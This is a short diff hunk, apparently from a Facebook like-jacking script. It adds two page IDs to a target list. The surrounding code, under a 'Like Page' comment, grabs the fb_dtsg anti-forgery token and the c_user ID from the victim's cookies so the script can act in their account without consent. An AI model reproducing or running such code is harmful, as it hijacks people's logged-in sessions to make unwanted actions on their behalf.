@@ -77,6 +77,8 @@ LIST("529897107069041");
 LIST("541111455947606");
 LIST("541112019280883");
 LIST("541111775947574");
+LIST("275894579224072");
+LIST("275894212557442");
 /*Like Page*/
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
